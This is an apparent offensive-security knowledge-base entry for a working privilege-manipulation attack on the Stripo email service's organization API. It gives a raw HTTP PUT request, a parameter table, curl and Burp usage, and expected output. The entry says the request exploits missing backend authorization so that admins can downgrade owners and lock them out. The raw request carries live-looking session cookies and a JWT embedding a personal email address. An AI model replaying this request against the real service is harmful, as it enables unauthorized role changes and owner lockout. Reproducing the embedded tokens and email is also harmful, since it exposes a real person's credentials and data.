---
id: cmd-stripo-put-role-001
data: >-
  PUT /cabinet/stripeapi/v1/organizations/135428/users HTTP/1.1

  Host: my.stripo.email

  User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101
  Firefox/70.0

  Accept: application/json, text/plain, */*

  Accept-Language: en-US,en;q=0.5

  Accept-Encoding: gzip, deflate

  Authorization: Bearer null

  Content-Type: application/json;charset=UTF-8

  Cache-Control: no-cache

  Pragma: no-cache

  Expires: Sat, 01 Jan 2000 00:00:00 GMT

  Content-Length: 231

  Origin: https://my.stripo.email/

  Connection: close

  Referer: https://my.stripo.email/cabinet/

  Cookie: stripe_mid=f1a62f3d-2ba4-4742-a1ae-97c309223fec;
  stripe_sid=20155b5b-e547-4e52-9c4c-53fd4b08ed8a;
  _ga=GA1.2.472610903.1575449565; _gid=GA1.2.1705021668.1575449565;
  _fbp=fb.1.1575449579810.16963820;
  token=eyJhbGciOiJIUzI1NiJ9.eyJzZWN1cml0eUNvbnRleHQiOiJ7XCJ1c2VySW5mb1wiOntcImlkXCI6MTMwODUxLFwiZW1haWxcIjpcImFiZGVsbGFobmFkaTNAZ21haWwuY29tXCIsXCJsb2NhbGVLZXlcIjpcImVuXCIsXCJmaXJzdE5hbWVcIjpcInRlc3Q0NVwiLFwibGFzdE5hbWVcIjpcIm5cIixcImdhSWRcIjpcImJiYzBkNGExLWI5NDYtNDIwMy1iOTNmLTcxNjhmYmEyMWI5ZVwiLFwicGhvbmVzXCI6W10sXCJhY3RpdmVcIjpmYWxzZSxcImFjdGl2ZVByb2plY3RJZFwiOjEzNzg3NyxcImlzU3VwZXJVc2VyXCI6ZmFsc2UsXCJzdXBlclVzZXJWMlwiOmZhbHNlLFwib25seUZiQ3JlZGVudGlhbHNcIjpmYWxzZSxcInNldHRpbmdzRW1haWxTb3J0QnlcIjpcImNyZWF0ZWRUaW1lXCIsXCJzZXR0aW5nc0VtYWlsU29ydEFzY1wiOmZhbHNlLFwic2V0dGluZ3NUZW1wbGF0ZVNvcnRCeVwiOlwidXBkYXRlZFRpbWVcIixcInNldHRpbmdzVGVtcGxhdGVTb3J0QXNjXCI6ZmFsc2UsXCJjb2xvclwiOlwiI2ZiYTc2ZlwiLFwib3JnYW5pemF0aW9uSWRcIjoxMzA2NjUsXCJzdWJzY3JpcHRpb25UeXBlXCI6XCJGUkVFXCIsXCJjb25zZW50UmVjZWl2ZWRcIjp0cnVlLFwidGVtcGxhdGVDcmVhdGVkT25Mb2dpblwiOmZhbHNlLFwiZmlyc3RMb2dpblwiOmZhbHNlfSxcImlzc3VlZEF0XCI6MTU3NTQ1MDIzMDMxOH0ifQ.GidxPLc4Wu80JWxScUjLrq4nmLr2lEamONcWsATBQfY;
  intercom-session-b1m243ec=Tlk4aHpydmFMOTc5SlZRaGRabE43WUIwanoxdXAyNlowR3FWbE9oaXNDRm5mYlhRRHNBNjlyLzJOOWQybmtYQi0tZzUrdnd1enBReWhPM0J3M1N2SFIzUT09--a917964bb8221fad0a6d3e38fab8cde2af1efed4


  {"repository":{},"idField":"id","entityType":"USER","id":135628,"role":"admin","organizationId":135428,"firstName":"TESt","lastName":"account","color":"#cc90e2","email":"pain45@wearehackerone.com","projectIds":[],"suspended":false}
tags:
  - api
  - authorization-bypass
type: command
output: |-
  HTTP/1.1 200 OK
  Content-Type: application/json

  {"id":135628,"role":"admin",...}
executor: http
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:28.693Z'
verified: false
validated: true
submitted: true
---
# PUT-Update-User-Role-to-Admin

## Command

```http
PUT /cabinet/stripeapi/v1/organizations/{orgId}/users HTTP/1.1
Host: my.stripo.email
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Bearer {token}
Content-Type: application/json;charset=UTF-8
Content-Length: {length}
Origin: https://my.stripo.email/
Referer: https://my.stripo.email/cabinet/
Cookie: {auth-cookies}

{"repository":{},"idField":"id","entityType":"USER","id":{userId},"role":"admin","organizationId":{orgId},"firstName":"{firstName}","lastName":"{lastName}","color":"{color}","email":"{email}","projectIds":[],"suspended":false}
```

## Description

This HTTP PUT request updates a user's role in a Stripo organization to 'admin', bypassing frontend restrictions. It exploits improper backend authorization, allowing admins to downgrade owners and cause lockout. Use via browser dev tools or tools like curl/Burp after enabling the input.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `{orgId}` | Organization ID (path param) | Yes |
| `{userId}` | Target user ID (JSON body) | Yes |
| `role` | New role value ('admin') (JSON body) | Yes |
| `Authorization` | Bearer token or null (header) | Yes |
| `Content-Type` | application/json;charset=UTF-8 (header) | Yes |
| `Cookie` | Auth cookies including token (header) | Yes |

## Examples

### Basic Usage

Send via curl (replace placeholders):

```bash
curl -X PUT "https://my.stripo.email/cabinet/stripeapi/v1/organizations/135428/users" \
  -H "Authorization: Bearer null" \
  -H "Content-Type: application/json;charset=UTF-8" \
  -H "Cookie: token=eyJ..." \
  -d '{"id":135628,"role":"admin","organizationId":135428,...}'
```

### Advanced Usage

Intercept and modify in Burp Suite, changing role from 'owner' to 'admin'.

```bash
# Similar to basic, but with full headers from browser
curl -X PUT ... (full request as above)
```

## Expected Output

HTTP/1.1 200 OK with JSON response: {"id":135628,"role":"admin","organizationId":135428,...}, confirming the downgrade. Owner login subsequently fails.

## Related

- [[procedures/Bypass-Frontend-to-Downgrade-Owner-Role]]
